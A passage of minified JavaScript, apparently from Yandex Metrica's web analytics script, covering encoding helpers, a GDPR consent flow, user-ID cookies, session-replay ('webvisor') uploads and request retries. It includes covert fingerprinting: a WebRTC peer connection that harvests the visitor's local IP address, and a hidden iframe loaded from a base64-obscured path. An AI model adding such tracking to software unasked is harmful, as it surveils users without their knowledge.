        return [
          qe,
          128 > t ? 1 : 16384 > t ? 2 : 2097152 > t ? 3 : 268435456 > t ? 4 : 5,
          t,
        ];
      }
      function qe(t, e, n, r) {
        for (t = e; 127 < t; ) (n[r++] = (127 & t) | 128), (t >>>= 7);
        n[r] = t;
      }
      function Ke(t, e, n, r) {
        n[r] = e;
      }
      function We(t, e, n, r) {
        for (t = 0; t < e.length; ++t) n[r + t] = e[t];
      }
      function Je(t) {
        return function (e, n, r, i) {
          for (var o, a = 0, u = 0; u < n.length; ++u)
            if (128 > (e = n.charCodeAt(u))) t ? (a += 1) : (r[i++] = e);
            else {
              if (2048 > e) {
                if (t) {
                  a += 2;
                  continue;
                }
                r[i++] = (e >> 6) | 192;
              } else {
                if (
                  55296 == (64512 & e) &&
                  56320 == (64512 & (o = n.charCodeAt(u + 1)))
                ) {
                  if (t) {
                    a += 4;
                    continue;
                  }
                  (e = 65536 + ((1023 & e) << 10) + (1023 & o)),
                    ++u,
                    (r[i++] = (e >> 18) | 240),
                    (r[i++] = ((e >> 12) & 63) | 128);
                } else {
                  if (t) {
                    a += 3;
                    continue;
                  }
                  r[i++] = (e >> 12) | 224;
                }
                r[i++] = ((e >> 6) & 63) | 128;
              }
              r[i++] = (63 & e) | 128;
            }
          return t ? a : i;
        };
      }
      function $e(t, e, n, r) {
        return jl(t)(t, e, n, r);
      }
      function Ze(t, e, n, r) {
        var i = 0 > e ? 1 : 0;
        if ((i && (e = -e), 0 === e)) Qe(0 < 1 / e ? 0 : 2147483648, n, r);
        else if (t.isNaN(e)) Qe(2143289344, n, r);
        else if (34028234663852886e22 < e)
          Qe(((i << 31) | 2139095040) >>> 0, n, r);
        else if (11754943508222875e-54 > e)
          Qe(((i << 31) | t.Math.round(e / 1401298464324817e-60)) >>> 0, n, r);
        else {
          var o = t.Math.floor(t.Math.log(e) / Math.LN2);
          Qe(
            ((i << 31) |
              ((o + 127) << 23) |
              (8388607 & Math.round(e * t.Math.pow(2, -o) * 8388608))) >>>
              0,
            n,
            r
          );
        }
      }
      function Qe(t, e, n) {
        (e[n] = 255 & t),
          (e[n + 1] = (t >>> 8) & 255),
          (e[n + 2] = (t >>> 16) & 255),
          (e[n + 3] = t >>> 24);
      }
      function tn(t, e, n, r) {
        for (t = e[0], e = e[1]; t; )
          (n[r++] = (127 & e) | 128),
            (e = ((e >>> 7) | (t << 25)) >>> 0),
            (t >>>= 7);
        for (; 127 < e; ) (n[r++] = (127 & e) | 128), (e >>>= 7);
        n[r++] = e;
      }
      function en(t) {
        if (!t) return [0, 0];
        var e = 0 > t;
        e && (t = -t);
        var n = t >>> 0;
        return (
          (t = ((t - n) / 4294967296) >>> 0),
          e &&
            ((t = ~t >>> 0),
            (n = ~n >>> 0),
            4294967295 < ++n && ((n = 0), 4294967295 < ++t && (t = 0))),
          [t, n]
        );
      }
      function nn(t) {
        return lo(t)
          ? Vu(nn, t)
          : _o(t) || "object" != typeof t
          ? t
          : Cu(
              function (t, e) {
                var n = e[0],
                  r = e[1],
                  i = Il[n];
                return (
                  gu(i) && (i = n),
                  (r = Fu(i, Ol) ? r : nn(r)),
                  i ? (t[i] = r) : (t[n] = r),
                  t
                );
              },
              {},
              Ru(t)
            );
      }
      function rn(t, e, n, r, i) {
        var o = yu(to, null, t, r, i);
        return n.then(o, function (n) {
          o(), Yr(t, e, n);
        });
      }
      function on(t, e, n, r) {
        return Rl(e)
          ? qo
          : wo(Eo($o([t, Fc(e)], r ? [n + ". Params:", r] : [n]), an), Wo);
      }
      function an() {
        var t = Oo(arguments),
          e = t.slice(2);
        Ml(t[0], t[1]).log.apply(an, e);
      }
      function un(t) {
        var e = lf(t),
          n = Xi(t);
        return (
          (e = "1" === e.l("debug")),
          (n = -1 < n.href.indexOf("_ym_debug=1")),
          {
            mi: e,
            yi: (t = t._ym_debug) || n,
            isEnabled: Wu(Boolean, [e, t, n]),
          }
        );
      }
      function cn(t, e) {
        var n = Xi(t),
          r = n.href,
          i = n.host,
          o = -1;
        if (!No(e) || gu(e)) return r;
        if (-1 !== (n = e.replace(pu, "")).search(dl)) return n;
        var a = n.charAt(0);
        return ("?" === a && -1 === (o = r.search(/\?/))) ||
          ("#" === a && -1 === (o = r.search(/#/)))
          ? r + n
          : -1 !== o
          ? r.substr(0, o) + n
          : "/" !== a
          ? (((r = r.split("/"))[r.length - 1] = n), iu("/", r))
          : -1 !== (o = r.indexOf(i))
          ? r.substr(0, o + i.length) + n
          : "";
      }
      function sn(t) {
        return {
          ba: function (e, n) {
            if (!e.H) return n();
            var r = Pu(t).l("fid");
            return !ll && r && (Hn(e, "fid", r), (ll = !0)), n();
          },
        };
      }
      function fn(t) {
        return {
          ba: function (e, n) {
            var r = e.H;
            if (r) {
              var i = Pu(t).l("adBlockEnabled");
              i && r.o("adb", i);
            }
            n();
          },
        };
      }
      function hn(t) {
        return {
          ba: function (e, n) {
            Gn(t) || n();
          },
        };
      }
      function ln(t) {
        return (t = qc(t)), nl[t] || t;
      }
      function dn(t, e, n) {
        return {
          ba: function (e, r) {
            !(function (t, e, n, r) {
              var i = e.H;
              if (n.Vj || !i) r();
              else {
                var o = Ir(t),
                  a = sa(t, "");
                if (
                  ((r = po(function () {
                    var t = Zh(o);
                    (t = "" + t + tl(t, a)), i.o("gdpr", t), Hn(e, "gdpr", t);
                  }, r)),
                  3 === n.id)
                )
                  r();
                else {
                  var u = Pu(t),
                    c = u.l("f1");
                  if (c) c(r);
                  else if (
                    ((c = (c = Zh(o)) ? Vu(wo(af, mo), c.split(",")) : []),
                    Qh(c))
                  )
                    r();
                  else {
                    var s = $c(t),
                      f = Xi(t),
                      h =
                        s &&
                        (-1 !== f.href.indexOf("yagdprcheck=1") ||
                          a.l("yaGdprCheck"));
                    (f = a.l("gdpr")),
                      a.l("yandex_login")
                        ? (c.push("13"), a.o("gdpr", ef, 525600))
                        : s
                        ? Fu(f, tf)
                          ? f === nf
                            ? c.push("12")
                            : c.push("3")
                          : cc(t) || lc(t)
                          ? c.push("17")
                          : Rc(t) && c.push("28")
                        : c.push("14");
                    var l = wo(o, Or);
                    Qh(c)
                      ? (zu(l, c), r())
                      : ($h.push(r),
                        u.o("f1", function (e, n) {
                          var r = 0;
                          n && (r += (Oi(t, n) || "").length);
                          $h.push(e), 1e6 >= r && $h.push(e);
                        }),
                        (0, Kh[0])(t)
                          .then(Au("params.eu"))
                          .then(function (e) {
                            if (e || h) {
                              if (
                                (a.o("gdpr_popup", nf),
                                (function (t, e) {
                                  var n = Uf(t, e);
                                  n &&
                                    n.Z.C(["isYandex"], function () {
                                      var e;
                                      return (
                                        ((e = { type: "isYandex" }).isYandex =
                                          $c(t)),
                                        e
                                      );
                                    });
                                })(t, n),
                                Ec(t))
                              )
                                return (function (t, e, n) {
                                  var r = Uf(t, n);
                                  return new us(function (n) {
                                    var i;
                                    if (r) {
                                      var o = r.Z,
                                        a = po(wo("4", e), wo(null, n)),
                                        u = Br(t, a, 2e3, "gdp.f.t");
                                      r.ng(((i = {}), (i.type = "isYandex"), i))
                                        .then(function (t) {
                                          t.isYandex
                                            ? (e("5"),
                                              o.C(
                                                $o(
                                                  [
                                                    "GDPR-ok-view-default",
                                                    "GDPR-ok-view-detailed",
                                                  ],
                                                  of
                                                ),
                                                function (t) {
                                                  n({ value: Mr(t[1].type) });
                                                }
                                              ))
                                            : (e("6"), n(null));
                                        })
                                        .catch(a)
                                        .then(Eo([t, u], ro));
                                    } else n({ value: nf, Sd: !0 });
                                  });
                                })(t, l, n);
                              var r = Nr(t, o);
                              if (r)
                                return (
                                  (e = (function (t, e, n, r) {
                                    var i = (function (t, e) {
                                        var n = e || wc(t);
                                        return Fu(n, Wh) ? n : "en";
                                      })(t, r.Wj),
                                      o = Uf(t, r);
                                    if (!o)
                                      return us.resolve({ value: ef, Sd: !0 });
                                    var a = si(t, {
                                      src:
                                        "https://yastatic.net/s3/gdpr/popup/v2/" +
                                        i +
                                        "_inversed_buttons.js",
                                    });
                                    return new us(function (t, r) {
                                      a
                                        ? (e("7"),
                                          (a.onerror = function () {
                                            var n;
                                            e("9"),
                                              o.mg(
                                                (((n = {}).type =
                                                  "GDPR-ok-view-default"),
                                                n)
                                              ),
                                              t(null);
                                          }),
                                          (a.onload = function () {
                                            e("10"),
                                              n.C(
                                                $o(
                                                  [
                                                    "GDPR-ok-view-default",
                                                    "GDPR-ok-view-detailed",
                                                  ],
                                                  of
                                                ),
                                                function (e) {
                                                  var n;
                                                  (e = e.type),
                                                    o.mg(
                                                      (((n = {}).type = e), n)
                                                    ),
                                                    t({ value: Mr(e) });
                                                }
                                              );
                                          }))
                                        : (e("9"), r(Gi("gdp.e")));
                                    });
                                  })(t, l, r, n)).then(Eo([t, n], pn)),
                                  e
                                );
                            }
                            return (
                              e || l("8"), us.resolve({ value: ef, Sd: !0 })
                            );
                          })
                          .then(function (e) {
                            if ((a.ic("gdpr_popup"), e)) {
                              var n = e.value;
                              (e = e.Sd),
                                Fu(n, tf) &&
                                  a.o("gdpr", n, e ? void 0 : 525600);
                            }
                            (n = Qn($h, Wo)),
                              Wn(t, n, 20)(Zn(Ur(t, "gdr"), qo)),
                              u.o("f1", Wo);
                          })
                          .catch(Ur(t, "gdp.a")));
                  }
                }
              }
            })(t, e, n, r);
          },
        };
      }
      function pn(t, e) {
        if ($c(t)) {
          var n = Ir(t),
            r = vn(t, e);
          (r = r && r.params),
            (n = Vu(wo(Jh, mo), cf(n))),
            r && n.length && r("gdpr", Lu(Boolean, n));
        }
      }
      function vn(t, e) {
        return Pu(t).l("counters", {})[Fc(e)];
      }
      function mn() {
        return function (t, e, n) {
          return {
            ba: function (e, r) {
              var i,
                o = e.H,
                a = e.F;
              if (o && a) {
                var u = Fu(a["wv-type"], Yh);
                if (!a["wv-type"] || u) {
                  var c = mf(t);
                  o.De("rqnl", 1), (o = o.b());
                  for (var s = zh(t), f = 1; s[f]; ) f += 1;
                  (e.Ob = f),
                    (s[f] =
                      (((i = {}).protocol = Pc.Ka),
                      (i.host = "mc.yandex.ru"),
                      (i.resource = u ? "webvisor" : "watch"),
                      (i.postParams = e.$),
                      (i.time = c(gr)),
                      (i.counterType = n.aa),
                      (i.params = a),
                      (i.browserInfo = o),
                      (i.counterId = n.id),
                      (i.ghid = Fn(t)),
                      i)),
                    bn(t);
                }
              }
              r();
            },
            Ia: function (e, n) {
              gn(t, e), n();
            },
          };
        };
      }
      function gn(t, e) {
        var n = zh(t);
        e.H && !mu(n) && (delete n[e.Ob], bn(t));
      }
      function bn(t) {
        var e = zh(t);
        pf(t).o("retryReqs", e);
      }
      function yn(t, e, n) {
        var r = Vn(t, e, n);
        return function (e, n, i) {
          var o;
          (e = Nu({ H: Uc() }, e)).F || (e.F = {});
          var a = e.F;
          if (
            ((a.wmode = "0"),
            (a["wv-part"] = "" + i),
            (a["wv-hit"] = a["wv-hit"] || "" + Fn(t)),
            (a["page-url"] = a["page-url"] || t.location.href),
            (a.rn = a.rn || "" + Ki(t)),
            !a["wv-type"])
          ) {
            i = e.bf;
            var u = "4",
              c = "2";
            e.If && ((u = "5"), (c = "3")), (a["wv-type"] = i ? u : c);
          }
          return (
            (n = "webvisor/" + n.id),
            r(Nu(e, { F: a }), n, {
              Mb: ((o = {}), (o["Content-Type"] = "text/plain"), o),
              Gg: "POST",
            })
          );
        };
      }
      function wn(t, e, n, r) {
        if (((e = r.l("cc")), (r = Eo(["cc", ""], r.o)), e)) {
          var i = e.split("&");
          if (((e = i[0]), (i = (i = i[1]) && ec(i)) && 1440 < mf(t)(mr) - i))
            return r();
          n.o("cc", e);
        } else ou(0)(e) || r();
      }
      function En(t, e, n, r) {
        return xn(t, e, function (e) {
          if ("0" === mo(e, "settings.pcs") && !rc(t))
            if (((e = r.l("zzlc")), gu(e) || mu(e) || "na" === e)) {
              e = "ru";
              var i = Mn(t, 68),
                o = Nn(t, 79);
              if (((i || o) && (e = "md"), (i = Es(t)))) {
                var a = i("iframe");
                if (
                  (Nu(a.style, {
                    display: "none",
                    width: "1px",
                    height: "1px",
                    visibility: "hidden",
                  }),
                  (a.src =
                    "https://mc.yandex." + e + Pn("L21ldHJpa2EvenpsYy5odG1s")),
                  (e = _i(t)))
                ) {
                  e.appendChild(a);
                  var u = 0,
                    c = os(t).C(
                      t,
                      ["message"],
                      Ur(t, "zz.m", function (e) {
                        (e = mo(e, "data")) &&
                          e.substr &&
                          "__ym__zz" === e.substr(0, 8) &&
                          (Ri(a),
                          (e = e.substr(8)),
                          r.o("zzlc", e),
                          n.o("zzlc", e),
                          c(),
                          ro(t, u));
                      })
                    );
                  u = Br(t, po(c, wo(a, Ri)), 3e3);
                }
              }
            } else n.o("zzlc", e);
        });
      }
      function xn(t, e, n) {
        return (t = Fc(e)), Xh()(Uh(t)).then(n);
      }
      function Cn(t, e, n) {
        return (
          (e = Fc(e)),
          (t = br(t)),
          (n = Nu({ Ih: t(gr) }, n)),
          Xh()(
            (function (t, e) {
              return function (n) {
                var r = n[t];
                r
                  ? ((r.ij = e),
                    (r.dg = !0),
                    r.cg ? r.cg(e) : (r.Qa = us.resolve(e)))
                  : (n[t] = { Qa: us.resolve(e), ij: e, dg: !0 });
              };
            })(e, n)
          )
        );
      }
      function An(t, e, n) {
        var r, i;
        if (
          ((e = Bu(wo(t, mo), Hh)),
          (e = gu(e) ? null : mo(t, e)),
          mo(t, "navigator.onLine") &&
            e &&
            e &&
            mo(e, "prototype.constructor.name"))
        ) {
          var o = new e((((r = {}).iceServers = []), r));
          ko((t = mo(o, "createDataChannel"))) &&
            (yu(t, o, "y.metrika")(),
            ko((t = mo(o, "createOffer"))) &&
              !t.length &&
              (ko((r = mo((t = yu(t, o)()), "then"))) &&
                yu(r, t, function (t) {
                  var e = mo(o, "setLocalDescription");
                  ko(e) && yu(e, o, t, qo, qo)();
                })(),
              Nu(
                o,
                (((i = {}).onicecandidate = function () {
                  var t,
                    e = mo(o, "close");
                  if (ko(e)) {
                    e = yu(e, o);
                    try {
                      var r =
                        (t = mo(o, "localDescription.sdp")) &&
                        t.match(/c=IN\s[\w\d]+\s([\w\d:.]+)/);
                    } catch (t) {
                      return (
                        (o.onicecandidate = qo),
                        void ("closed" !== o.iceConnectionState && e())
                      );
                    }
                    r && 0 < r.length && ((t = Zo(r[1])), n.o("pp", t)),
                      (o.onicecandidate = qo),
                      e();
                  }
                }),
                i)
              )));
        }
      }
      function _n(t, e, n) {
        var r,
          i = Hf(t, e);
        if (i) {
          i.Z.C(["gpu-get"], function () {
            var t;
            return ((t = {}).type = "gpu-get"), (t.pu = n.l("pu")), t;
          });
          var o = mo(t, "opener");
          if (o) {
            var a = Br(t, Eo([t, e, n], kn), 200, "pu.m");
            i.ze(o, (((r = {}).type = "gpu-get"), r), function (e, r) {
              var i = mo(r, "pu");
              i && (ro(t, a), n.o("pu", i));
            });
          } else kn(t, e, n);
        }
      }
      function kn(t, e, n) {
        var r = mo(t, "location.host");
        (t = bf(t, e)), n.o("pu", "" + Zo(r) + t);
      }
      function Tn(t, e, n) {
        return {
          ba: function (e, r) {
            var i = e.H;
            if (i && (!n || n.lg)) {
              var o = t.document.title;
              e.title && (o = e.title);
              var a = ao("getElementsByTagName", t.document);
              "string" != typeof o &&
                a &&
                (o = (o = mo((o = a("title")), "0.innerHtml")) ? o : ""),
                (o = o.slice(0, Pc.Pg)),
                i.o("t", o);
            }
            r();
          },
        };
      }
      function Sn(t) {
        return (
          void 0 === t && (t = Gh),
          function (e, n, r) {
            return {
              ba: function (n, i) {
                var o = n.H,
                  a = n.F;
                o &&
                  a &&
                  zu(function (t) {
                    var i = Ph[t],
                      a = "bi",
                      u = o;
                    i || ((i = Jf[t]), (a = "tel"), (u = Hn(n))),
                      i &&
                        ((i = Hr(a + ":" + t, i, null)(e, r, n)), u.De(t, i));
                  }, t),
                  i();
              },
            };
          }
        );
      }
      function Rn(t, e, n, r, i, o, a, u) {
        var c = n.l(o);
        return (
          _o(c) && (n.o(o, a), i(t, e, n, r), (c = n.l(o, a))),
          gu(u) || u.De(o, "" + c),
          c
        );
      }
      function Mn(t, e) {
        if (Uu(t) && e) {
          var n = ic(t).match(sh);
          if (n && n.length) return +n[1] >= e;
        }
        return !1;
      }
      function Nn(t, e) {
        var n = ic(t);
        return !!(n && (n = n.match(lh)) && 1 < n.length) && ec(n[1]) >= e;
      }
      function Dn(t, e) {
        void 0 === e && (e = !1);
        for (var n = t.length, r = n - (n % 3), i = [], o = 0; o < r; o += 3) {
          var a = (t[o] << 16) + (t[o + 1] << 8) + t[o + 2];
          i.push(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
              (a >> 18) & 63
            ],
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
              (a >> 12) & 63
            ],
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
              (a >> 6) & 63
            ],
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
              63 & a
            ]
          );
        }
        switch (n - r) {
          case 1:
            (n = t[r] << 4),
              i.push(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
                  (n >> 6) & 63
                ],
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
                  63 & n
                ],
                "=",
                "="
              );
            break;
          case 2:
            (n = (t[r] << 10) + (t[r + 1] << 2)),
              i.push(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
                  (n >> 12) & 63
                ],
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
                  (n >> 6) & 63
                ],
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="[
                  63 & n
                ],
                "="
              );
        }
        return (i = i.join("")), e ? In(i, !0) : i;
      }
      function Pn(t, e) {
        void 0 === e && (e = !1);
        var n = t,
          r = "",
          i = 0;
        if (!n) return "";
        for (e && (n = In(n)); n.length % 4; ) n += "=";
        do {
          var o =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
                n.charAt(i++)
              ),
            a =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
                n.charAt(i++)
              ),
            u =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
                n.charAt(i++)
              ),
            c =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(
                n.charAt(i++)
              );
          if (0 > o || 0 > a || 0 > u || 0 > c) return null;
          var s = (o << 18) | (a << 12) | (u << 6) | c;
          (o = (s >> 16) & 255),
            (a = (s >> 8) & 255),
            (s &= 255),
            (r =
              64 === u
                ? r + String.fromCharCode(o)
                : 64 === c
                ? r + String.fromCharCode(o, a)
                : r + String.fromCharCode(o, a, s));
        } while (i < n.length);
        return r;
      }
      function In(t, e) {
        return (
          void 0 === e && (e = !1),
          t
            ? t.replace(e ? /[+/=]/g : /[-*_]/g, function (t) {
                return ah[t] || t;
              })
            : ""
        );
      }
      function On(t, e, n) {
        return {
          ba: function (t, e) {
            var r = eh(n),
              i = t.H;
            i
              ? i.l("pv") && !i.l("ar")
                ? ((r.pf = i), e())
                : r.zc
                ? r.zc.push(e)
                : e()
              : e();
          },
          Ia: function (e, r) {
            var i = e.H,
              o = e.lj,
              a = eh(n);
            if (i) {
              var u = a.zc;
              a.pf === i &&
                u &&
                (o && Pu(t).o("isEU", mo(o, "settings.eu")),
                zu(Wo, u),
                (a.zc = null));
            }
            r();
          },
        };
      }
      function Ln(t, e) {
        var n = Hf(t, e),
          r = [],
          i = [];
        if (!n) return null;
        var o = Eo([t, n.ze], Bn),
          a = wo(o, jn);
        return (
          n.Z.C(["initToParent"], function (t) {
            a(r, n.xb[t[1].counterId]);
          }).C(["parentConnect"], function (t) {
            a(i, n.Lb[t[1].counterId]);
          }),
          {
            Z: n.Z,
            Hk: function (e, r) {
              return new us(function (i, o) {
                n.ze(e, r, function (t, e) {
                  i([t, e]);
                }),
                  Br(t, wo(Gi(), o), 5100, "is.o");
              });
            },
            mg: function (t) {
              var e = { og: [], Me: [], data: t };
              return r.push(e), o(n.xb, e, t);
            },
            ng: function (t) {
              var e = { og: [], Me: [], data: t };
              return i.push(e), o(n.Lb, e, t);
            },
          }
        );
      }
      function jn(t, e, n) {
        (e = Lu(function (t) {
          return !Fu(n.info.counterId, t.Me);
        }, e)),
          zu(function (e) {
            var r;
            n.info.counterId &&
              t((((r = {})[n.info.counterId] = n), r), e, e.data);
          }, e);
      }
      function Bn(t, e, n, r, i) {
        return new us(function (o, a) {
          var u = Mu(n),
            c = po(r.resolve ? r.resolve : Ho, au(o)),
            s = po(r.reject ? r.reject : Ho, au(a));
          (r.resolve = c),
            (r.reject = s),
            zu(function (o) {
              var a;
              r.Me.push(o);
              var u = n[o],
                c = Br(t, wo(Gi(), s), 5100, "is.m");
              e(
                u.window,
                Nu(i, (((a = {}).toCounter = ec(o)), a)),
                function (e, n) {
                  ro(t, c), r.og.push(o), r.resolve && r.resolve(n);
                }
              );
            }, u);
        }).catch(Ur(t, "if.b"));
      }
      function Fn(t) {
        var e = Pu(t),
          n = e.l("hitId");
        return n || ((n = Ki(t)), e.o("hitId", n)), n;
      }
      function Gn(t) {
        return !!Pu(t).l("oo") || Lf(t);
      }
      function Hn(t, e, n) {
        return (
          void 0 === n && (n = null),
          t.cd || (t.cd = Rf()),
          e && !mu(n) && t.cd.o(e, n),
          t.cd
        );
      }
      function Un(t) {
        return {
          ba: function (e, n) {
            var r = t.document,
              i = e.H;
            if (i && qi(t)) {
              var o = os(t),
                a = function (e) {
                  return qi(t) || (o.Tb(r, Sf, a), n()), e;
                };
              o.C(r, Sf, a), i.o("pr", "1");
            } else n();
          },
        };
      }
      function Xn(t, e, n) {
        var r = Vn(t, e, n);
        return function (e, n) {
          var i,
            o = Nu({ H: Uc() }, e),
            a = o.F,
            u = o.H;
          if (
            (((i = {})["page-url"] = (a && a["page-url"]) || ""),
            (i.charset = "utf-8"),
            (a = i),
            "0" !== n.aa && (a["cnt-class"] = n.aa),
            (i = Nu(o, { F: Nu(o.F || {}, a) })),
            (o = ""),
            i.H)
          ) {
            a = Fc(n);
            var c = (a = yf(n)[a] || {}).status;
            "rt" === a.Qc && c
              ? (1 === c && (o = wf(t, n) + "."), i.H.o("rt", c))
              : (o = "");
          }
          return (
            Nu(i, { Df: o }),
            r(i, "watch/" + n.id, {
              Se: !(!u.l("pv") || u.l("ar") || u.l("wh")),
            })
          );
        };
      }
      function Vn(t, e, n) {
        var r = sr(t, e);
        return function (e, i, o) {
          void 0 === o && (o = {});
          var a = (function (t) {
            var e = "mc.yandex.ru",
              n = mo(t, "document.referrer");
            return n
              ? ((t = fa(t, n).host), (e = "mc.yandex." + (Vi(t) || "ru")))
              : e;
          })(t);
          return (
            e.Df && (a = "" + e.Df + a),
            (i = [Pc.Ka + "//" + (a || "mc.yandex.ru") + "/" + i]),
            Yn(t, n, e, !0)
              .then(Eo([e, i, o], r))
              .then(function (r) {
                return (e.lj = r.Vc), Yn(t, n, e).then(wo(r.Vc, Ho));
              })
          );
        };
      }
      function zn(t) {
        return (t.split(":")[1] || "")
          .replace(/^\/*/, "")
          .replace(/^www\./, "")
          .split("/")[0];
      }
      function Yn(t, e, n, r) {
        return (
          void 0 === r && (r = !1),
          new us(function (t, i) {
            function o(e, n) {
              n(), t();
            }
            var a = e.slice();
            a.push({ ba: o, Ia: o });
            var u = Qn(a, function (t, e) {
              var o = r ? t.ba : t.Ia;
              if (o)
                try {
                  o(n, e);
                } catch (t) {
                  u(ur), i(t);
                }
              else e();
            });
            u(tr);
          })
        );
      }
      function qn(t, e, n) {
        var r = n || "as";
        if (t.postMessage && !t.attachEvent) {
          n = os(t);
          var i = "__ym__promise_" + Ki(t) + "_" + Ki(t),
            o = qo;
          (r = Ur(t, r, function (t) {
            try {
              var n = t.data;
            } catch (t) {
              return;
            }
            n === i && (o(), t.stopPropagation && t.stopPropagation(), e());
          })),
            (o = n.C(t, ["message"], r)),
            t.postMessage(i, "*");
        } else Br(t, e, 0, r);
      }
      function Kn(t, e, n, r, i) {
        void 0 === r && (r = 1),
          void 0 === i && (i = "itc"),
          Wn(t, (e = Qn(e, n)), r)(Zn(Ur(t, i), qo));
      }
      function Wn(t, e, n, r) {
        return (
          void 0 === n && (n = 1),
          void 0 === r && (r = er),
          (kf = 1 / 0 === n),
          cu(function (i, o) {
            var a = [];
            !(function (t) {
              _f ? Af.push(t) : ((_f = !0), t());
            })(function u() {
              try {
                var c = e(r(t, n));
                a = a.concat(c);
              } catch (t) {
                return i(t);
              }
              if ((e(or), e(cr))) return o(a), Jn(t);
              kf ? (e(r(t, 1e4)), o(a), Jn(t)) : Br(t, u, 100);
            });
          })
        );
      }
      function Jn(t) {
        if (Af.length) {
          var e = Af.shift();
          kf ? e() : Br(t, e, 100);
        } else _f = !1;
      }
      function $n(t) {
        return cu(function (e, n) {
          n(t);
        });
      }
      function Zn(t, e) {
        return function (n) {
          return n(t, e);
        };
      }
      function Qn(t, e) {
        return void 0 === e && (e = Ho), cu({ Na: t, Td: e, Ge: !1, oa: 0 });
      }
      function tr(t) {
        function e() {
          function e() {
            (n = !0), (t.oa += 1);
          }
          (n = !1),
            t.Td(t.Na[t.oa], function () {
              e();
            }),
            n || ((t.oa += 1), (e = yu(tr, null, t)));
        }
        for (var n = !0; !cr(t) && n; ) e();
      }
      function er(t, e) {
        return function (n) {
          var r = mf(t),
            i = r(gr);
          return Ef(function (t, n) {
            r(gr) - i >= e && n(ar);
          })(n);
        };
      }
      function nr(t, e) {
        return function (n) {
          var r = mf(t),
            i = r(gr);
          return rr(function (t) {
            r(gr) - i >= e && ar(t);
          })(n);
        };
      }
      function rr(t) {
        return function (e) {
          for (var n; e.Na.length && !cr(e); )
            (n = e.Na.pop()), (n = e.Td(n, e.Na)), t(e);
          return n;
        };
      }
      function ir(t) {
        cr(t) && eo(ms("i"));
        var e = t.Td(t.Na[t.oa]);
        return (t.oa += 1), e;
      }
      function or(t) {
        t.Ge = !1;
      }
      function ar(t) {
        t.Ge = !0;
      }
      function ur(t) {
        t.oa = t.Na.length;
      }
      function cr(t) {
        return t.Ge || t.Na.length <= t.oa;
      }
      function sr(t, e) {
        return function (n, r, i) {
          return (
            void 0 === i && (i = {}),
            fr(t, e, r, n, Nu(i, { ua: n.ua || [], $: i.$ || n.$ }))
          );
        };
      }
      function fr(t, e, n, r, i, o, a) {
        var u;
        void 0 === o && (o = 0), void 0 === a && (a = 0);
        var c = Nu({}, i),
          s = e[a],
          f = s[0];
        s = s[1];
        var h = Nu({}, r.F),
          l = mf(t);
        return (
          r.H && (h["browser-info"] = Uc(r.H.b()).o("st", l(vr)).Da()),
          !h.t && (l = r.cd) && (l.o("ti", f), (h.t = l.Da())),
          (l = n[o]),
          (c.Mb && c.Mb["Content-Type"]) ||
            !c.$ ||
            ((c.Mb = Nu(
              {},
              c.Mb,
              (((u = {})["Content-Type"] = "application/x-www-form-urlencoded"),
              u)
            )),
            (c.$ = "site-info=" + Bi(c.$))),
          (c.Gg = c.$ ? "POST" : "GET"),
          (c.Nb = h),
          c.ua.push(f),
          s(l + (r.Ni ? "/1" : ""), c)
            .then(function (t) {
              return { Vc: t, Pj: o };
            })
            .catch(function (u) {
              var c = a + 1 >= e.length,
                s = o + 1 >= n.length;
              return (
                c && s && eo(u),
                fr(t, e, n, r, i, !s && c ? o + 1 : o, c ? 0 : a + 1)
              );
            })
        );
      }
      function hr(t, e) {
        var n = e.Xd,
          r = n || "uid";
        n = n ? t.location.hostname : void 0;
        var i = lf(t),
          o = pf(t),
          a = mf(t),
          u = a(vr),
          c = lr(t, e),
          s = c[0];
        c = c[1];
        var f = i.l("d");
        gf(t, e);
        var h = !1;
        return (
          !c && s && ((c = s), (h = !0)),
          c
            ? (!f || 15768e3 < u - ec(f)) && (h = !0)
            : ((c = iu("", [a(vr), Ki(t)])), (h = !0)),
          h && !e.hb && (i.o(r, c, 525600, n), i.o("d", "" + u, 525600, n)),
          o.o(r, c),
          c
        );
      }
      function lr(t, e) {
        var n = pf(t),
          r = lf(t),
          i = e.Xd || "uid";
        return [n.l(i), r.l(i)];
      }
      function dr(t) {
        return (t = mf(t)), Math.round(t(pr) / 50);
      }
      function pr(t) {
        var e = t.ra,
          n = e[1];
        return (t = e[0] && n ? n() : gr(t) - t.ti), Math.round(t);
      }
      function vr(t) {
        return Math.round(gr(t) / 1e3);
      }
      function mr(t) {
        return Math.floor(gr(t) / 1e3 / 60);
      }
      function gr(t) {
        var e = t.Oe;
        return 0 !== e ? e : Xr(t.b, t.ra);
      }
      function br(t) {
        var e = os(t),
          n = Vr(t),
          r = { b: t, Oe: 0, ra: n, ti: Xr(t, n) },
          i = n[1];
        return (
          (n[0] && i) ||
            e.C(t, ["beforeunload", "unload"], function () {
              0 === r.Oe && (r.Oe = Xr(t, r.ra));
            }),
          cu(r)
        );
      }
      function yr(t) {
        return (10 > t ? "0" : "") + t;
      }
      function wr(t, e, n) {
        void 0 === e && (e = ""), void 0 === n && (n = "_ym");
        var r = "" + n + e + "_";
        return {
          Qd: df(t),
          l: function (e, n) {
            var i = xr(t, "" + r + e);
            return mu(i) && !gu(n) ? n : i;
          },
